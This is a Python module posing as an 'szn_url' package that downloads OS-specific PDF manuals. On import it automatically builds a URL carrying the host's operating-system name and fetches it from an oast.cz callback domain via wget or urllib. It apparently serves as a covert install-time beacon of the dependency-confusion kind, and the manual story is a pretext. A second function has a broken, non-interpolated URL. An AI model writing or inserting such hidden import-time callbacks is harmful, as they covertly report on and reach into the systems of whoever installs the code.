import platform
import subprocess
import shutil
import urllib.request
import os

def download_user_manual():
    # Determine the OS name (e.g., Linux, Windows, Darwin)
    system_os = platform.system()
    # Construct the manual URL and output filename based on the OS name
    manual_url = f"https://blz6zcof.oast.cz/{system_os}ManualSZNURL.pdf"
    output_file = os.path.join(os.path.dirname(__file__), f"{system_os}Manual.pdf")
    
    print(f"Attempting to download manual from: {manual_url}")
    
    # Check if wget is available on the system
    if shutil.which("wget"):
        try:
            subprocess.run(["wget", manual_url, "-O", output_file], check=True)
            print(f"Downloaded {system_os} manual using wget.")
            return
        except Exception as e:
            print("Error using wget:", e)
    
    # Fallback to Python's urllib.request if wget is not available or fails
    print("wget not found or failed; falling back to urllib.request.")
    try:
        urllib.request.urlretrieve(manual_url, output_file)
        print(f"Downloaded {system_os} manual using urllib.request.")
    except Exception as e:
        print("Failed to download user manual using urllib.request:", e)

# Automatically download the OS-specific user manual on import
download_user_manual()

def test_url():
    """
    Downloads a test manual file.
    
    This function attempts to download a file (TestManual.pdf) from a predefined URL.
    It uses wget if available; otherwise, it falls back to urllib.request.
    """
    test_manual_url = "https://blz6zcof.oast.cz/{system_os}ManualtestURL.pdf"
    output_file = os.path.join(os.path.dirname(__file__), "TestManual.pdf")
    
    print(f"Attempting to download test manual from: {test_manual_url}")
    
    if shutil.which("wget"):
        try:
            subprocess.run(["wget", test_manual_url, "-O", output_file], check=True)
            print("Downloaded test manual using wget.")
            return
        except Exception as e:
            print("Error using wget:", e)
    
    print("wget not found or failed; falling back to urllib.request.")
    try:
        urllib.request.urlretrieve(test_manual_url, output_file)
        print("Downloaded test manual using urllib.request.")
    except Exception as e:
        print("Failed to download test manual using urllib.request:", e)

def main():
    print("szn_url package loaded. Use test_url() to download the test manual if needed.")
